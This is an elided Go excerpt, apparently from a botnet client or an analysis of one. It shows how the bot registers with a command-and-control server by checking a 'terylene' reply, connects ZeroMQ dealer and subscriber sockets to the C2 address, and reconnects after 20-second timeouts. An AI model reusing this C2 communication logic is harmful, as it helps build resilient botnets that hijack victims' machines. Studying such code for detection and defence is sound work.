	...
	for {
		...
		case <-subdown:
			...
			case <-time.After(time.Second * 20):
				...
				go subhandler(subscriber, C2info.postC2info.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown)
			}
		case <-dealdown:
			log.Println("dealer channel down")
			select {
			...
			case <-time.After(time.Second * 20):
				...
				dealer.Connect(fmt.Sprintf("tcp://%s:%s", C2info.postC2info.C2ip, C2info.postC2info.rport))
...
func register(zmqins zmqinstance, postinfo postC2info, timeout time.Duration) error {
	...
	if res[0] == "terylene" {
		...
		go subhandler(subscriber, postinfo.C2ip, conninfo.bot, C2info.bport, conninfo.connid, subdown)
...
func dealerhandle(dealer *zmq.Socket, dealdown chan<- struct{}, dealmigsignal chan<- postC2info) {
	...
	dealer.SetRcvtimeo(time.Second * 5)
	for {
		res, err := dealer.RecvMessage(0)
		if err != nil {
...
func subhandler(subscriber *zmq.Socket, C2ip, bot, bport, connid string, subdown chan<- struct{}) {
	subscriber.Connect(fmt.Sprintf("tcp://%s:%s", C2ip, bport))
	subscriber.SetRcvtimeo(time.Second * 5)
